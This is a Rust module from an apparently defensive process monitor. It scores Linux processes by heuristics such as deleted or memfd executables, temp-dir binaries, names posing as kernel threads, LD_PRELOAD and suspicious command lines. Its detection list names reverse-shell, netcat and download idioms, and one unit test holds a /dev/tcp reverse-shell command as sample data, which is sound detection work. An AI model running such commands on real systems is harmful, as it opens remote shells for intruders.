//! Heuristic scoring of processes.

use serde::{Deserialize, Serialize};

use zs_core::config::ProcMonConfig;
use zs_core::model::{ProcInfo, Severity};

use crate::procinfo::{cmdline_string, read_ld_preload, remote_endpoints};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Reason {
    pub name: String,
    pub score: u32,
    pub detail: String,
}

#[derive(Debug, Clone)]
pub struct Evaluation {
    pub score: u32,
    pub severity: Severity,
    pub reasons: Vec<Reason>,
}

impl Evaluation {
    pub fn reason_strings(&self) -> Vec<String> {
        self.reasons
            .iter()
            .map(|r| format!("[{}] {} (+{})", r.name, r.detail, r.score))
            .collect()
    }
}

struct Builder {
    score: u32,
    reasons: Vec<Reason>,
}

impl Builder {
    fn add(&mut self, name: &str, score: u32, detail: impl Into<String>) {
        self.score = (self.score + score).min(100);
        self.reasons.push(Reason {
            name: name.to_string(),
            score,
            detail: detail.into(),
        });
    }
}

/// Command line patterns that are suspicious on their own.
const CMDLINE_PATTERNS: &[(&str, u32, &str)] = &[
    ("/dev/tcp/", 70, "reverse shell via /dev/tcp"),
    ("nc -e", 65, "netcat with -e (shell execution)"),
    ("ncat -e", 65, "ncat with -e (shell execution)"),
    ("bash -i", 40, "interactive shell spawned by a process"),
    ("base64 -d", 40, "base64 payload decoding"),
    ("curl http", 25, "downloads a payload with curl"),
    ("wget http", 25, "downloads a payload with wget"),
    ("chmod +x", 20, "makes a downloaded file executable"),
    ("/etc/ld.so.preload", 60, "tampers with /etc/ld.so.preload"),
    ("history -c", 30, "clears shell history (anti-forensics)"),
];

const MASQUERADE_PREFIXES: &[&str] = &[
    "kworker",
    "ksoftirqd",
    "kthreadd",
    "rcu_",
    "migration",
    "kswapd",
    "netns",
];

fn exe_in_temp_dir(exe: &str) -> Option<(&'static str, u32)> {
    if exe.starts_with("/dev/shm/") {
        Some(("/dev/shm", 45))
    } else if exe.starts_with("/tmp/") {
        Some(("/tmp", 30))
    } else if exe.starts_with("/var/tmp/") {
        Some(("/var/tmp", 30))
    } else {
        None
    }
}

fn is_user_writable(exe: &str) -> bool {
    exe.starts_with("/tmp/")
        || exe.starts_with("/var/tmp/")
        || exe.starts_with("/dev/shm/")
        || exe.starts_with("/home/")
        || exe.starts_with("/media/")
        || exe.starts_with("/mnt/")
}

/// Some comm/exe differences are systemic, not malicious: the kernel truncates
/// `comm` to 15 bytes, shells run under alternative names (sh -> dash) and
/// script interpreters rename their processes (node -> MainThread). Only flag
/// mismatches that none of these explain.
fn benign_name_variation(comm: &str, basename: &str) -> bool {
    let comm = comm.trim_start_matches('-');
    if comm.is_empty() || comm.eq_ignore_ascii_case(basename) {
        return true;
    }
    // The kernel truncates `comm` to 15 bytes, making comparison unreliable.
    if comm.len() >= 15 {
        return true;
    }
    // Renames that keep one name a prefix of the other, or that pick a
    // suffix of the real binary name (sh -> /usr/bin/dash, bash, ksh, ...).
    if basename.starts_with(comm) || comm.starts_with(basename) || basename.ends_with(comm) {
        return true;
    }
    // Interpreters set their own process titles freely.
    const INTERPRETERS: &[&str] = &[
        "node", "nodejs", "python", "python3", "java", "deno", "bun", "electron", "ruby", "perl",
        "php",
    ];
    if INTERPRETERS.contains(&basename) {
        return true;
    }
    // Version-named binaries (claude/2.1.3, firefox/92.0) don't carry the
    // tool name in their file name.
    basename.chars().all(|c| c.is_ascii_digit() || c == '.')
}

pub fn evaluate(p: &ProcInfo, _cfg: &ProcMonConfig) -> Evaluation {
    let mut b = Builder {
        score: 0,
        reasons: Vec::new(),
    };

    // 1. Executable deleted from disk (classic dropper behaviour).
    if p.exe_deleted {
        b.add(
            "deleted_executable",
            60,
            "running from a deleted executable (dropper or self-deleting malware)",
        );
    }

    // 2. memfd execution (fileless).
    if let Some(exe) = &p.exe {
        if exe.contains("/memfd:") {
            b.add(
                "memfd_execution",
                70,
                format!("executed from memory file descriptor ({exe})"),
            );
        }
        if let Some((dir, score)) = exe_in_temp_dir(exe) {
            b.add(
                "temp_executable",
                score,
                format!("executable lives in {dir} (world-writable location)"),
            );
        }
        // 3. Root process whose binary is user writable (privilege hole).
        if p.euid == 0 && is_user_writable(exe) {
            b.add(
                "root_from_user_writable",
                70,
                format!("runs as root but executable is user-writable ({exe})"),
            );
        }
        // 4. Kernel thread masquerading.
        let basename = exe.rsplit('/').next().unwrap_or(exe);
        if MASQUERADE_PREFIXES.iter().any(|p| basename.starts_with(p)) {
            b.add(
                "kernel_thread_masquerade",
                85,
                format!("uses a kernel-thread style name '{basename}' but has a real executable"),
            );
        } else if basename != p.name
            && !p.name.is_empty()
            && !benign_name_variation(&p.name, basename)
        {
            // 5. comm/exe mismatch (weak signal, many false positives).
            b.add(
                "name_mismatch",
                10,
                format!(
                    "process name '{}' differs from executable '{basename}'",
                    p.name
                ),
            );
        }
    }

    // 6. Suspicious command line.
    let cmdline = cmdline_string(p);
    for (needle, score, why) in CMDLINE_PATTERNS {
        if cmdline.contains(needle) {
            b.add("suspicious_cmdline", *score, format!("{why}: '{needle}'"));
        }
    }

    // 7. LD_PRELOAD injection (only readable for our own/root processes).
    if let Some(preload) = read_ld_preload(p.pid) {
        if !preload.trim().is_empty() {
            b.add(
                "ld_preload",
                55,
                format!("LD_PRELOAD is set to '{preload}'"),
            );
        }
    }

    // 8. Network activity from a temp-dir executable.
    if let Some(exe) = &p.exe {
        if (exe_in_temp_dir(exe).is_some() || p.exe_deleted) && b.score > 0 {
            let endpoints = remote_endpoints(p.pid);
            if !endpoints.is_empty() {
                b.add(
                    "temp_exec_with_network",
                    25,
                    format!("has active connections: {}", endpoints.join(", ")),
                );
            }
        }
    }

    let score = b.score;
    Evaluation {
        score,
        severity: Severity::from_score(score),
        reasons: b.reasons,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn base(pid: u32) -> ProcInfo {
        ProcInfo {
            pid,
            ppid: 1,
            name: "test".into(),
            state: 'S',
            exe: Some("/usr/bin/test".into()),
            euid: 1000,
            uid: 1000,
            ..Default::default()
        }
    }

    fn cfg() -> ProcMonConfig {
        ProcMonConfig::default()
    }

    #[test]
    fn clean_process_scores_zero() {
        let ev = evaluate(&base(std::process::id()), &cfg());
        assert_eq!(ev.score, 0, "{:?}", ev.reasons);
    }

    #[test]
    fn deleted_executable_is_flagged() {
        let mut p = base(999_999); // pid that does not exist: skip /proc reads
        p.exe_deleted = true;
        p.exe = Some("/usr/bin/evil".into());
        let ev = evaluate(&p, &cfg());
        assert!(ev.score >= 60);
        assert!(ev.reasons.iter().any(|r| r.name == "deleted_executable"));
    }

    #[test]
    fn memfd_and_temp_exec() {
        let mut p = base(999_998);
        p.exe = Some("/memfd:payload (deleted)".into());
        let ev = evaluate(&p, &cfg());
        assert!(ev.score >= 70);

        let mut p2 = base(999_997);
        p2.exe = Some("/dev/shm/x".into());
        p2.exe_deleted = true;
        let ev2 = evaluate(&p2, &cfg());
        assert!(ev2.score >= 70);
    }

    #[test]
    fn reverse_shell_cmdline() {
        let mut p = base(999_996);
        p.cmdline = vec![
            "bash".into(),
            "-c".into(),
            "bash -i >& /dev/tcp/1.2.3.4/4444".into(),
        ];
        let ev = evaluate(&p, &cfg());
        assert!(ev.score >= 70);
    }

    #[test]
    fn masquerade_scores_high() {
        let mut p = base(999_995);
        p.name = "kworker/0:1".into();
        p.exe = Some("/tmp/kworker".into());
        let ev = evaluate(&p, &cfg());
        assert!(ev.score >= 85);
        assert!(ev
            .reasons
            .iter()
            .any(|r| r.name == "kernel_thread_masquerade"));
    }

    #[test]
    fn score_is_capped() {
        let mut p = base(999_994);
        p.exe_deleted = true;
        p.exe = Some("/dev/shm/x".into());
        p.name = "kworker1".into();
        p.euid = 0;
        p.cmdline = vec![
            "bash".into(),
            "/dev/tcp/1.1.1.1/9 nc -e".into(),
            "bash -i base64 -d".into(),
        ];
        let ev = evaluate(&p, &cfg());
        assert_eq!(ev.score, 100);
    }

    #[test]
    fn benign_name_variations_are_not_flagged() {
        // Kernel truncation of comm to 15 bytes.
        assert!(benign_name_variation(
            "gnome-keyring-d",
            "gnome-keyring-daemon"
        ));
        assert!(benign_name_variation(
            "startplasma-way",
            "startplasma-wayland"
        ));
        // Daemon self-renames.
        assert!(benign_name_variation("pipewire-pulse", "pipewire"));
        assert!(benign_name_variation("SSHD", "sshd"));
        // Shells under alternative names and interpreter threads.
        assert!(benign_name_variation("sh", "dash"));
        assert!(benign_name_variation("-sh", "bash"));
        assert!(benign_name_variation("MainThread", "node"));
        assert!(benign_name_variation("claude", "2.1.10"));
        // Real mismatches still flagged.
        assert!(!benign_name_variation("sshd", "cryptominer"));

        let mut p = base(999_993);
        p.name = "gnome-keyring-d".into();
        p.exe = Some("/usr/bin/gnome-keyring-daemon".into());
        let ev = evaluate(&p, &cfg());
        assert_eq!(ev.score, 0, "{:?}", ev.reasons);
    }
}
